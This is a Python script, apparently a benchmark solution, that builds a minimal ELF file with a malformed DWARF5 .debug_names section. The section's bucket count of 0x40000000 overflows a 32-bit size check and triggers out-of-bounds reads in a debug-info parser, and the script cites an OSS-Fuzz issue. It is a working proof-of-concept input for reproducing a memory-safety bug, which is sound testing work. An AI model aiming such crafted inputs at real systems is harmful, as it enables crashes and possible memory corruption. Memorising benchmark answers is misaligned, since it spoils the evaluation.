import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Helper function to create a minimal ELF file with a specific section
        def create_elf(debug_names_data):
            # ELF64 Header
            # e_ident: Magic, Class=2 (64), Data=1 (LE), Version=1, OSABI=0, ABIVersion=0
            e_ident = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
            # e_type=1 (REL), e_machine=62 (x86_64), e_version=1
            # e_entry=0, e_phoff=0, e_shoff=64
            # e_flags=0, e_ehsize=64, e_phentsize=0, e_phnum=0
            # e_shentsize=64, e_shnum=3, e_shstrndx=2
            elf_hdr = struct.pack('<16sHHIQQQIHHHHHH', 
                                  e_ident, 1, 62, 1, 0, 0, 64, 0, 64, 0, 0, 64, 3, 2)
            
            # Section Header Table
            # Entry 0: NULL Section
            sh_null = b'\x00' * 64
            
            # Calculations for offsets
            # ELF Header (64) + 3 Section Headers (3*64=192) = 256 bytes
            offset_data = 256
            
            # .shstrtab data
            shstrtab_data = b'\x00.debug_names\x00.shstrtab\x00'
            
            # Section 1: .debug_names
            # sh_name = 1 (index in shstrtab)
            # sh_type = 1 (SHT_PROGBITS)
            # sh_flags = 0
            # sh_addr = 0
            # sh_offset = offset_data
            # sh_size = len(debug_names_data)
            # sh_link = 0, sh_info = 0, sh_addralign = 1, sh_entsize = 0
            s1_size = len(debug_names_data)
            sh_debug_names = struct.pack('<IIQQQQIIQQ', 
                                         1, 1, 0, 0, offset_data, s1_size, 0, 0, 1, 0)
            
            # Section 2: .shstrtab
            # sh_name = 14
            # sh_type = 3 (SHT_STRTAB)
            offset_shstrtab = offset_data + s1_size
            s2_size = len(shstrtab_data)
            sh_shstrtab = struct.pack('<IIQQQQIIQQ', 
                                      14, 3, 0, 0, offset_shstrtab, s2_size, 0, 0, 1, 0)
            
            # Combine all parts
            return elf_hdr + sh_null + sh_debug_names + sh_shstrtab + debug_names_data + shstrtab_data

        # Construct malicious .debug_names section content
        # Vulnerability: Integer overflow in bucket_count calculation (OSS-Fuzz 383170474 / Issue 65039)
        # When bucket_count is 0x40000000, bucket_count * 4 overflows to 0 in 32-bit arithmetic.
        # This bypasses the section size check (header_size + 0 <= section_size).
        # However, the loop iterates up to bucket_count, reading past the end of the buffer.

        # DWARF5 .debug_names Header
        # Unit Length: 4 bytes (DWARF32)
        # Version: 2 bytes (5)
        # Padding: 2 bytes (0)
        # Comp Unit Count: 4 bytes
        # Local Type Unit Count: 4 bytes
        # Foreign Type Unit Count: 4 bytes
        # Bucket Count: 4 bytes (Malicious value)
        # Name Count: 4 bytes
        # Abbrev Table Size: 4 bytes
        # Augmentation String Size: 4 bytes
        # Augmentation String: 0 bytes
        
        bucket_count = 0x40000000  # 1073741824
        
        # Header body (32 bytes)
        header_body = struct.pack('<HHIIIIIII',
            5, 0,          # Version, Padding
            0,             # CU Count
            0,             # Local TU Count
            0,             # Foreign TU Count
            bucket_count,  # Bucket Count (Overflow Trigger)
            0,             # Name Count
            0,             # Abbrev Table Size
            0              # Aug String Size
        )
        
        # Unit Length (4 bytes)
        unit_length = len(header_body)
        payload = struct.pack('<I', unit_length) + header_body
        
        # Generate full ELF
        return create_elf(payload)